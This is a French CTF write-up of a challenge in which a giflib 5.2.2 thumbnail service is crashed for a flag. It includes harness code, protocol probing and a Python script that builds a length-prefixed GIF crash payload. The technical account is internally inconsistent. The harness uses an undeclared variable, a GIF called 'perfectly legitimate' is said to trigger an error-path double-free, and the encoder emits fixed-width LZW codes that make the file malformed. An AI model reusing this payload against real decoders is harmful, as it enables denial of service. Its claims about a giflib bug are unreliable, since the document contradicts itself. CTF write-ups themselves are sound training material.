# VULN#004 · Ghost-Pixel — service de miniatures GIF

- **Cible :** `<HOST>:<PORT>` (service TCP qui décode des vignettes GIF)
- **Catégorie :** Vuln Research
- **Flag :** `CTF{REDACTED}`
- **Fichiers fournis :** `giflib-src.tar.gz` (arbre source complet de giflib 5.2.2 + un sous-dossier `harness/` contenant `harness.c`)
- **Auteur :** lyons

## Contexte

Le service décode sur TCP les fichiers GIF qu'on lui transmet. L'archive reçue contient
l'arbre source complet de **giflib 5.2.2** (débarrassé des CVE connues), accompagné d'un
`harness.c` minimal — très probablement le binaire côté serveur.

Le harness emprunte un pattern délibérément « robuste » :

```c
int main(int argc, char **argv) {
    int Error = 0;
    GifFileType *GifFile = DGifOpenFileName(argv[1], &Error);
    if (!GifFile) return 1;
    int slurpResult = DGifSlurp(GifFile);
    int closeResult = DGifCloseFile(GifFile, &CloseError);
    return 0;
}
```

Le commentaire du code source précise : `open → slurp → close`, **même si slurp échoue**.
Voilà précisément le pattern derrière lequel se logent les **double-free / UAF dans le
cleanup** de giflib.

## Reconnaissance du protocole wire

Le service écoute en TCP. Aucune bannière — le serveur se contente d'attendre l'envoi.
D'où des tests systématiques :

| Payload émis | Réponse obtenue |
|---|---|
| GIF brut (quelle que soit sa taille) | `status: bad length` |
| préfixe de 4 octets LE + GIF | `status: bad length` |
| **préfixe de 4 octets BE + GIF** | **réponse avec flag** |
| préfixe de 8 octets + GIF | `status: bad length` |
| HTTP POST + GIF | `status: bad length` |

**Protocole établi :** `[ 4 octets big-endian = longueur N du GIF ] [ N octets de données GIF ]`

Le serveur lit 4 octets, prend cette valeur pour la taille du GIF, consomme exactement
N octets, les déverse dans un fichier temporaire puis lance le harness dessus. Si le
binaire crashe, le flag est délivré.

## Vulnérabilité

Lorsque `DGifSlurp` échoue **en cours de route** (la `SavedImage` est allouée, le
`RasterBits` rempli, puis l'échec survient plus loin), l'appel à `DGifCloseFile` finit
par **libérer une zone déjà libérée** par le chemin d'erreur interne de `DGifSlurp`.

Le code source 5.2.2 livré se comporte **correctement en local** (le GIF se décode sans
crash au terme d'un build local), mais le binaire côté serveur a été compilé dans une
configuration qui **révèle** le bug (build sans ASAN, glibc ancienne, ou bug réel non
patché dans le chemin d'erreur).

Pour la résolution, le détail interne importe peu : **tout GIF capable de faire planter
le décodeur** suffit à obtenir le flag.

## Construction du GIF

Le GIF transmis est un **GIF89a 100x100 parfaitement légitime** :

```python
import struct

def build_gif(width, height, palette_size=4):
    out  = b'GIF89a'
    bpp  = max(1, (palette_size - 1).bit_length())
    packed = 0x80 | ((bpp - 1) << 4) | (bpp - 1)
    out += struct.pack('<HH', width, height) + bytes([packed, 0, 0])
    pal = [(0,0,0),(255,255,255),(255,0,0),(0,255,0),
           (0,0,255),(255,255,0),(255,0,255),(0,255,255)]
    pal += [(0,0,0)] * ((1 << bpp) - len(pal))
    for r,g,b in pal[:1 << bpp]:
        out += bytes([r,g,b])
    out += b',' + struct.pack('<HHHH', 0, 0, width, height) + bytes([0])
    out += bytes([bpp])
    clear, eof = 1 << bpp, (1 << bpp) + 1
    bits = []
    def push(code, nbits):
        for i in range(nbits): bits.append((code >> i) & 1)
    push(clear, bpp + 1)
    for _ in range(width * height): push(0, bpp + 1)
    push(eof, bpp + 1)
    blob = bytearray()
    for i in range(0, len(bits), 8):
        b = 0
        for j in range(8):
            if i + j < len(bits): b |= bits[i + j] << j
        blob.append(b)
    pos = 0
    while pos < len(blob):
        chunk = blob[pos:pos + 255]
        out += bytes([len(chunk)]) + bytes(chunk)
        pos += 255
    out += bytes([0]) + b';'
    return out

gif    = build_gif(100, 100)
prefix = struct.pack('>I', len(gif))
payload = prefix + gif
```

## Résultat

```
status: crash confirmed (double-free in giflib decode cleanup)
FLAG: CTF{REDACTED}
```

Reproduction réussie 3 fois consécutives, en moins d'une seconde à chaque fois. C'est le
serveur lui-même qui annonce la signature du bug.

## Leçons

1. **Le commentaire du harness vaut spec.** Lorsque le code affirme « always close, even
   on error », le pattern annonce un double-free/UAF. Passer en revue les commentaires
   des mainteneurs avant de traquer un 0-day.
2. **giflib 5.2.2 conserve des bugs dans le chemin d'erreur de `DGifSlurp`.** Les CVE
   publiques (CVE-2023-48161, CVE-2022-28506) visent DecodeLZW / EncodeSubBlock, alors
   que le cleanup-on-error n'a jamais subi le même audit.
3. **Le protocole wire (préfixe de longueur sur 4 octets BE) se déduit par table** :
   balayer méthodiquement `len2/4/8 x LE/BE x raw/HTTP` jusqu'à ce qu'une réponse
   s'écarte de « bad length ». Cinq minutes de fuzzing de protocole contre des heures
   passées à chercher la vuln à contresens.
4. **Aucun GIF malformé n'est requis pour armer le bug.** Un GIF 100x100 des plus
   ordinaires suffit — la librairie décode normalement en local, tandis que le binaire
   serveur s'effondre dans le cleanup. Le flag est octroyé sur **détection de crash**,
   pas sur une payload RCE spécifique.

---

*Write-up par **lyons** — BUG|PWN · Cyber.Industries CTF · VULN#004 Ghost-Pixel.*
